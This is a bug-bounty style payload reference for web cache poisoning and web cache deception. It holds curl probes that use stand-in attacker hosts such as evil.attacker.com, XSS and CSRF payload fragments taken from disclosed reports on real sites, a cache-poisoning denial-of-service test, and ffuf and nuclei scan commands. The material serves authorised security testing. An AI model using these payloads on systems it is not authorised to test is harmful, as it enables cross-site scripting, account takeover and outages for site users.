# Web Cache — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `X-Forwarded-Host: evil.com` `X-Host: evil.com` `X-Forwarded-Scheme: http`

- `/account/profile.css` `/account/profile%2ecss` `/account/profile;.css`

- Cache buster -> `?cb=123` then poison the canonical URL



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 5× | `%00` |

| 1× | `GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2 / Host: hackerone.com / x-forwarded-scheme: http` |

| 1× | `</script` |

| 1× | `</sc"ript>` |

| 1× | `GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1 / Host: downloads.exodus.com / Authorization: SharedKeyLite myaccount` |

| 1× | `https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]` |

| 1× | `https://amazon.ca/dp/███/../████████` |

| 1× | `GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.c` |

| 1× | `GET /patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1 HTTP/1.1 / Host: updates.rockstargames.com / tr` |

| 1× | `X-Forwarded-Host : foobar.pl"><img src=x onerror=blah>` |

| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |

| 1× | `GET /u/x.css HTTP/1.1` |

| 1× | `POST /users/$username/preferences/email.json HTTP/1.1 / / _method=PUT&email=$attacker_email&authenticity_token=$csrf_token` |

| 1× | `/u/$rand.css` |

| 1× | `<% woff2_url = "#{asset_path("fontawesome-webfont.woff2")}?#{font_domain}&v=4.7.0".html_safe %> / <link rel="preload" href="<%=woff2_url%>` |

| 1× | `GET /?xx HTTP/1.1 / Host: meta.discourse.org / X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>` |

| 1× | `https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.dom` |

| 1× | `https://help.shopify.com/es/manual/your-account/copyright-and-trademark/<RANDOM_STRING>.css` |

| 1× | `https://hatchful.shopify.com/furniture-logo-maker%25%32%46random.css` |

| 1× | `curl -i -s -k -X $'GET' \ / -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \ / $'https://feder` |



## Parameters observed



`for[]` · `for` · `dontpoisoneveryone` · `cachebuster` · `cb` · `cachebust` · `yeettest` · `token` · `qwKzzSR` · `xyzxyz` · `hackerone` · `petIncluded` · `filterByTotalPrice` · `ssr` · `email` · `authenticity_token` · `letme` · `enable_registration` · `redirectTo` · `referrer_page_location`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_web-cache.txt` | 53 |

| `~/.local/share/hackerone-reports/wordlists/params_web-cache.txt` | 29 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_web-cache.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_web-cache.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Find unkeyed headers and cache-deception paths manually; templates only cover known patterns.



```sh

nuclei -u https://target -tags cache \

       -severity low,medium,high,critical -rl 40 -o nuclei_web-cache.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/cache-poisoning-fuzz.yaml \

       -rl 40 -o nuclei_web-cache_cache-poisoning-fuzz.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic/cache-poisoning.yaml \

       -rl 40 -o nuclei_web-cache_cache-poisoning.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Confirm caching behavior:**

```bash

# Send twice, compare Age header

curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"

curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"

```



**Test unkeyed X-Forwarded-Host:**

```bash

curl -s -H "X-Forwarded-Host: evil.attacker.com" \

  "https://target.com/page" | grep -i "evil.attacker.com"

```



**Test Web Cache Deception (path appending):**

```bash

# Authenticated session cookie required

curl -s -b "session=YOUR_SESSION" \

  "https://target.com/account/profile.css"



# Then fetch without auth from another client

curl -s "https://target.com/account/profile.css"

```



**Force cache miss to test poison without hitting cached version:**

```bash

# Use a unique cache-busting query param to land on a fresh key — do NOT rely on

# client-sent "Cache-Control: no-cache" (per RFC 7234 it requests revalidation, not

# skip-storage, and Cloudflare/Fastly/Akamai generally ignore it on cacheable assets).

curl -s -H "X-Forwarded-Host: canary.attacker.com" \

     "https://target.com/page?cb=$RANDOM"

```



**DoS via poisoned error response:**

```bash

curl -s -H "X-Forwarded-Host: aaaaaaaaaaa.invalid" \

  "https://target.com/js/app.js" -I

# Check if next clean request returns error

curl -s -I "https://target.com/js/app.js" | grep "HTTP/"

```



**Grep patterns in Burp/ZAP response history:**

```

# Headers indicating cache hit

X-Cache: HIT

CF-Cache-Status: HIT

Age: [1-9]



# Reflected unkeyed input in body

evil\.attacker\.com

canary\d+\.



# Web cache deception indicators

Content-Type: text/css  (but response is HTML/JSON)

Cache-Control: public.*max-age  (on authenticated endpoint)

```



**Parameter pollution test:**

```bash

curl -s "https://target.com/page?cb=1&param=CANARY_VALUE" | grep CANARY_VALUE

# Then check if clean request returns poisoned version

curl -s "https://target.com/page?cb=1"

```



**Burp Suite Intruder wordlist for unkeyed headers:**

```

X-Forwarded-Host

X-Host

X-Forwarded-Server

X-HTTP-Host-Override

Forwarded

X-Original-URL

X-Rewrite-URL

X-Forwarded-Scheme

X-Forwarded-Proto

True-Client-IP

```



---



### Origin header → ACAO cache poisoning

Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Access-Control-Allow-Origin` and then cached: `curl -H "Origin: evil.example" URL -I` on two consecutive hits. A cached attacker/`*` ACAO breaks CORS for legit users (cache-DoS); a cached permissive ACAO enables cross-user data reads. Disclosed: reports/591302.
